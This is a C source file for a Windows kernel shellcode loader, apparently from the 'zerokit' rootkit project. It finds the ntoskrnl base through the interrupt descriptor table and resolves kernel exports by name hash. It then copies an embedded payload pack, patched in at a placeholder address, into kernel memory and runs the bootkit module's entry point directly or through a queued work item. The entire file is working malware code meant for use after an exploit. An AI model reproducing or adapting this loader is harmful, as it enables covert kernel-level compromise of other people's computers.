#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../../../shared/types.h"
#include "../../../../shared/pe.h"
#include "../../../../0kit/mod_shared/zerokit.h"

#pragma pack(push, 1)

typedef struct _IDTR
{
    uint16_t limit;
    uint8_t* addr;
} IDTR, *PIDTR;

#ifdef _WIN64

typedef struct _IDT_ENTRY
{
    uint16_t offset00_15;
    uint16_t selector;
    uint8_t ist:3;		// Interrupt Stack Table
    uint8_t zeroes:5;
    uint8_t gateType:4;
    uint8_t zero:1;
    uint8_t dpl:2;
    uint8_t p:1;
    uint16_t offset16_31;
    uint32_t offset32_63;
    uint32_t unused;
} IDT_ENTRY, *PIDT_ENTRY;

#else

typedef struct _IDT_ENTRY
{
    uint16_t offset00_15;
    uint16_t selector;
    uint8_t unused:5;
    uint8_t zeroes:3;
    uint8_t gateType:5;
    uint8_t dpl:2;
    uint8_t p:1;
    uint16_t offset16_31;
} IDT_ENTRY, *PIDT_ENTRY;

#endif // __AMD64_

#pragma pack(pop)

#define FUNCS_COUNT 3

typedef pvoid_t (*FnExAllocatePoolWithTag)(int PoolType, size_t NumberOfBytes, ULONG Tag);
typedef VOID (*FnExQueueWorkItem)(PWORK_QUEUE_ITEM WorkItem, WORK_QUEUE_TYPE QueueType);
typedef KIRQL (*FnKeGetCurrentIrql)(VOID);

typedef LONG (*FnEntryPoint)(pvoid_t modBase, pvoid_t ptr);

#define fnExAllocatePoolWithTag funcs[0]
#define fnExQueueWorkItem funcs[1]
#define fnKeGetCurrentIrql funcs[2]
// #define fnKeInsertQueueDpc funcs[3]

void shellcode_zk_loader()
{
    IDTR idtr;
    uint32_t i, j, n, len;
    uint8_t* kernBase = NULL;
    PIDT_ENTRY pIdtEntry;
    uint8_t* pPackBuffer;
    FnEntryPoint payloadEntry;
    uint8_t* pZkBuffer;
    uint32_t zkSize;
    pzerokit_header_t pPayloadHdr;
    pmod_header_t pModHdr;
    pmods_pack_header_t pModsPackHdr;
    PWORK_QUEUE_ITEM pWorkItem;
    //PRKDPC pDpc;
    bool_t funcFound = FALSE;
    pvoid_t funcs[FUNCS_COUNT];
    uint32_t hashes[FUNCS_COUNT];

    hashes[0] = 0x756CEEDA;
    hashes[1] = 0x088F6581;
    hashes[2] = 0x228D6A01;
//     hashes[3] = 0x5200A18A;

    __stosb((uint8_t*)funcs, 0, sizeof(funcs));

    __sidt(&idtr);

    // Ищем базу ntoskrnl.exe
    len = idtr.limit / sizeof(IDT_ENTRY);

    for (i = 0; i <= len && funcFound == FALSE; ++i) {
        pIdtEntry = (PIDT_ENTRY)(idtr.addr + (i * sizeof(IDT_ENTRY)));

        if (pIdtEntry->p == 1) {
            if ((pIdtEntry->gateType & 6) == 6) {
#ifdef _WIN64
                kernBase = (uint8_t*)((uintptr_t)pIdtEntry->offset00_15 | ((uintptr_t)pIdtEntry->offset16_31 << 16) | ((uintptr_t)pIdtEntry->offset32_63 << 32));
#else
                kernBase = (uint8_t*)((uintptr_t)pIdtEntry->offset00_15 | ((uintptr_t)pIdtEntry->offset16_31 << 16));
#endif
                *(uint16_t*)(&kernBase) &= 0xF000;
#ifdef _WIN64
                while (kernBase > (uint8_t*)0xFFFF000000000000UI64) {
#else
                while (kernBase > (uint8_t*)0x80000000) {
#endif
                    if (*(uint16_t*)kernBase == 0x5A4D && *(uint16_t*)(*(uint32_t*)(kernBase + 0x3C) + kernBase) == 0x4550) {
                        for (n = 0; n < FUNCS_COUNT; ++n) {
                            PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)kernBase;
                            PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(kernBase + dosHdr->e_lfanew);
                            PIMAGE_EXPORT_DIRECTORY pExports;
                            uint32_t NumberOfFuncNames;
                            uint32_t* AddressOfNames;
                            uint32_t* AddressOfFunctions;
                            uint16_t index;

                            pExports = (PIMAGE_EXPORT_DIRECTORY)(kernBase + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

                            NumberOfFuncNames = pExports->NumberOfNames;
                            AddressOfNames = (uint32_t*)(kernBase + pExports->AddressOfNames);

                            for (j = 0; j < NumberOfFuncNames; ++j) {
                                char* pThunkRVAtemp = (char*)(kernBase + *AddressOfNames);
                                if (pThunkRVAtemp != NULL) {
                                    uint32_t cHashVal = 0;
                                    uint8_t* ptr = (uint8_t*)pThunkRVAtemp;

                                    for ( ; *ptr != '\0'; ++ptr) {
                                        cHashVal = ((cHashVal >> 11) | (cHashVal << (32 - 11)));
                                        cHashVal += *ptr;
                                    }

                                    if (cHashVal == hashes[n]) {
                                        UINT16* AddressOfNameOrdinals = (uint16_t*)(kernBase + pExports->AddressOfNameOrdinals);
                                        AddressOfNameOrdinals += (uint16_t)j;
                                        index = *AddressOfNameOrdinals;
                                        AddressOfFunctions = (uint32_t*)(kernBase +  pExports->AddressOfFunctions);
                                        AddressOfFunctions += index;
                                        funcs[n] = (pvoid_t)(kernBase + *AddressOfFunctions);
                                        break;
                                    }
                                }
                                AddressOfNames++;
                            }

                            if (funcs[n] == NULL) {
                                return;
                            }
                        }
                        funcFound = TRUE;
                        break;
                    }
                    kernBase -= 4096;
                }
            }
        }
    }

#ifdef _WIN64
    __stosq((uint64_t*)&pZkBuffer, 0xAAAAAAAAAAAAAAAAULL, 1);
#else
    __asm {
        mov dword ptr [pZkBuffer], 0xAAAAAAAA
    }
#endif // W_IN64

// #ifdef _WIN64
//     __debugbreak();
// #else
//     __asm int 3
// #endif // _WIN64

    pPayloadHdr = (pzerokit_header_t)(pZkBuffer + sizeof(exploit_startup_header_t) + 1024 + 2);

    pPackBuffer = (uint8_t*)((FnExAllocatePoolWithTag)fnExAllocatePoolWithTag)(0, pPayloadHdr->sizeOfPack + sizeof(exploit_startup_header_t), 'ZPAG');
    if (pPackBuffer != NULL) {
        __movsb(pPackBuffer, pZkBuffer, pPayloadHdr->sizeOfPack + sizeof(exploit_startup_header_t));
#ifdef _WIN64
        pModsPackHdr = (pmods_pack_header_t)(pPackBuffer + sizeof(exploit_startup_header_t) + pPayloadHdr->sizeOfBootkit);
        pModHdr = (pmod_header_t)((uint8_t*)pModsPackHdr + (sizeof(mods_pack_header_t) << 1) + pModsPackHdr->sizeOfPack);
        // Смещение от начала заголовка первого блока до начала конфигурационной области.
        pModHdr->confOffset = ((pmods_pack_header_t)((uint8_t*)pModHdr - sizeof(mods_pack_header_t)))->sizeOfPack;
#else
        pModHdr = (pmod_header_t)(pPackBuffer + sizeof(exploit_startup_header_t) + pPayloadHdr->sizeOfBootkit + sizeof(mods_pack_header_t));
        // Смещение от начала заголовка первого блока до начала конфигурационной области.
        pModHdr->confOffset = pPayloadHdr->sizeOfPack - pPayloadHdr->sizeOfBootkit - pPayloadHdr->sizeOfBundle - pPayloadHdr->sizeOfConfig - sizeof(mods_pack_header_t);
#endif // _WIN64

        payloadEntry = (FnEntryPoint)((PUCHAR)pModHdr + pModHdr->entryPointRVA);
#ifdef _WIN64
        if (((FnKeGetCurrentIrql)fnKeGetCurrentIrql)() > PASSIVE_LEVEL) {
            pWorkItem = (PWORK_QUEUE_ITEM)((FnExAllocatePoolWithTag)fnExAllocatePoolWithTag)(NonPagedPool, sizeof(WORK_QUEUE_ITEM), 0xAABBCCDD);
            pWorkItem->WorkerRoutine = (PWORKER_THREAD_ROUTINE)payloadEntry;
            pWorkItem->Parameter = (PVOID)(pPackBuffer + sizeof(exploit_startup_header_t) + 1 + 2);
            pWorkItem->List.Flink = NULL;

            ((FnExQueueWorkItem)fnExQueueWorkItem)(pWorkItem, DelayedWorkQueue);
            
        }
        else
#endif
        {
            payloadEntry(pPackBuffer + sizeof(exploit_startup_header_t) + 1, NULL);
        }        
    }
}
